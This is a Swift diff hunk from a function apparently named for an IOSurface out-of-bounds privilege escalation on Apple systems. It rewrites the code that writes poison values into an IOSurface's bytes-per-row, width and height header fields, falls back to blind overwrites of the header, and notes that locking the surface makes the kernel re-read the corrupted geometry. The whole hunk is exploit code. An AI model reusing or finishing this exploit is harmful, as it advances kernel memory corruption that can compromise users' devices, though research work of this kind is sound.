@@ -2553,24 +2553,26 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
         var corrupted = false
 
         if let off = bprOff {
-            basePtr.advanced(by: off).assumingMemoryBound(to: UInt32.self).pointee = POISON_BPR
+            UnsafeMutableRawPointer(basePtr.advanced(by: off)).storeBytes(of: POISON_BPR, as: UInt32.self)
             step("  poison BPR=0x\(String(POISON_BPR,radix:16)) @ hdr+0x\(String(off,radix:16))")
             corrupted = true
         }
         if let off = widthOff {
-            basePtr.advanced(by: off).assumingMemoryBound(to: UInt32.self).pointee = POISON_DIM
+            UnsafeMutableRawPointer(basePtr.advanced(by: off)).storeBytes(of: POISON_DIM, as: UInt32.self)
             step("  poison W=0x\(String(POISON_DIM,radix:16)) @ hdr+0x\(String(off,radix:16))")
             corrupted = true
         }
         if let off = heightOff {
-            basePtr.advanced(by: off).assumingMemoryBound(to: UInt32.self).pointee = POISON_DIM
+            UnsafeMutableRawPointer(basePtr.advanced(by: off)).storeBytes(of: POISON_DIM, as: UInt32.self)
             step("  poison H=0x\(String(POISON_DIM,radix:16)) @ hdr+0x\(String(off,radix:16))")
             corrupted = true
         }
         if !corrupted {
             step("  no fields found — blind poison at hdr+0x0..+0xb")
-            let p32 = basePtr.assumingMemoryBound(to: UInt32.self)
-            p32[0] = POISON_BPR; p32[1] = POISON_DIM; p32[2] = POISON_DIM
+            let rawBase = UnsafeMutableRawPointer(basePtr)
+            rawBase.storeBytes(of: POISON_BPR, as: UInt32.self)
+            rawBase.advanced(by: 4).storeBytes(of: POISON_DIM, as: UInt32.self)
+            rawBase.advanced(by: 8).storeBytes(of: POISON_DIM, as: UInt32.self)
         }
 
         // ── IOSurfaceLock — triggers kernel geometry re-read ─────────────────────
